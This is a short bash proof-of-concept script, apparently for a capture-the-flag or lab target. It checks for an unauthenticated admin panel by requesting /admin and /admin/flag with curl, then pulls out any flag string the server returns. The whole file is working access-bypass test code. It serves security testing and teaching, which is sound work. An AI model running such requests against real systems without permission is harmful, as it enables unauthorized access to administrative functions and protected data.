#!/bin/bash

# POC: Unauthenticated Admin Panel Access
# Demonstrates critical authentication bypass allowing access to admin functions and sensitive flag data

TARGET="${1:-http://localhost:80}"

echo "=================================================="
echo "Unauthenticated Admin Panel Access POC"
echo "=================================================="
echo ""

# Test 1: Access admin panel without authentication
echo "[*] Test 1: Accessing admin panel without authentication"
echo "[*] URL: $TARGET/admin"
ADMIN_RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/admin")
ADMIN_HTTP_CODE=$(echo "$ADMIN_RESPONSE" | tail -n1)
ADMIN_BODY=$(echo "$ADMIN_RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $ADMIN_HTTP_CODE"
if [ "$ADMIN_HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Admin panel is accessible without authentication!"
    echo "[+] Response contains: $(echo "$ADMIN_BODY" | head -c 200)..."
else
    echo "[-] Admin panel returned status: $ADMIN_HTTP_CODE (not accessible)"
fi
echo ""

# Test 2: Access flag endpoint without authentication
echo "[*] Test 2: Accessing flag endpoint without authentication"
echo "[*] URL: $TARGET/admin/flag"
FLAG_RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/admin/flag")
FLAG_HTTP_CODE=$(echo "$FLAG_RESPONSE" | tail -n1)
FLAG_BODY=$(echo "$FLAG_RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $FLAG_HTTP_CODE"
if [ "$FLAG_HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Flag endpoint is accessible without authentication!"
    echo "[+] Flag Retrieved:"
    echo "$FLAG_BODY"
    
    # Try to extract flag from common patterns
    FLAG_MATCH=$(echo "$FLAG_BODY" | grep -oP 'flag\{[^}]*\}' || echo "$FLAG_BODY" | grep -oP 'flag.*' | head -c 100)
    if [ -n "$FLAG_MATCH" ]; then
        echo "[+] Extracted flag: $FLAG_MATCH"
    fi
else
    echo "[-] Flag endpoint returned status: $FLAG_HTTP_CODE"
fi
echo ""

# Test 3: Verify no authentication headers are required
echo "[*] Test 3: Verifying no authentication required (no headers provided)"
echo "[*] Making request without any authentication headers..."
NO_AUTH_RESPONSE=$(curl -s -w "\n%{http_code}" -H "User-Agent: test" "$TARGET/admin/flag")
NO_AUTH_HTTP_CODE=$(echo "$NO_AUTH_RESPONSE" | tail -n1)

if [ "$NO_AUTH_HTTP_CODE" = "200" ]; then
    echo "[+] CONFIRMED: No authentication mechanism is enforced"
else
    echo "[-] Request returned status: $NO_AUTH_HTTP_CODE"
fi
echo ""

echo "=================================================="
echo "POC Execution Complete"
echo "=================================================="